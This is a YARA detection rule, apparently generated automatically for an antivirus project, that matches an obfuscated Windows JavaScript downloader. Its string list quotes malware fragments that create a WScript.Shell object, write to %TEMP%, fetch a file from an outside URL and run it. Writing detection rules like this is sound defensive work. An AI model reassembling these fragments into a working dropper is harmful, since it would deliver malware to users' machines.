rule sig_20160427_5514e4dcb42d87b5846252a9e0e2de1d {
  meta:
    description = "datamaliciousorder - file 20160427_5514e4dcb42d87b5846252a9e0e2de1d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cf3e6b59d23663bce98990b244a1d6c0efb36fca33a4a664c86064071d03777d"

  strings:
    $s1  = "function DsglkIkrmf() {return LglckXysjp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qut5JWI" ascii
    $s2  = "function DsglkIkrmf() {return LglckXysjp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qut5JWI" ascii
    $s3  = "function PvuyhIonzz(FoakrIfggl, CucyzFdywo){VjcldDeart = VjcldDeart * 1; return FoakrIfggl - CucyzFdywo;};" fullword ascii
    $s4  = "var LglckXysjp = function VfdhdDxlwb() {return VfjyuMngjx[IgxxmTjwni](\"WScript\"+\".Shell\");}(), IgjrySmauv = 11;" fullword ascii
    $s5  = "CucumAlohr[XhiuoRmpxo](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var VfjyuMngjx = this[\"WScript\"];" fullword ascii
    $s7  = "function GdzjmZhtbr(){return KjnagOhvgd + \"\";};" fullword ascii
    $s8  = "if (CucumAlohr[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function EvlynLtkhe() {return ((SywfsNgjfq == true) && (SywfsNgjfq == SmdmqDxnzy)) ? 1 : VjcldDeart;};" fullword ascii
    $s10 = "function OymlzFdhvn(XpxgzAviru){LglckXysjp[\"R\"+\"un\"](XpxgzAviru, VjcldDeart, VjcldDeart);};" fullword ascii
    $s11 = "function RzhmpMsiwx()" fullword ascii
    $s12 = "var SmdmqDxnzy = false;" fullword ascii
    $s13 = "SmdmqDxnzy = true; " fullword ascii
    $s14 = "var SywfsNgjfq = false;" fullword ascii
    $s15 = "OwyyePzvji = true;" fullword ascii
    $s16 = "function GgjlrQiwau(){return 23;};" fullword ascii
    $s17 = "var OwyyePzvji = false;" fullword ascii
    $s18 = "function JabzbTchrv(){return IgxxmTjwni;};" fullword ascii
    $s19 = "SywfsNgjfq = true; " fullword ascii
    $s20 = "var MerduQadsb = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}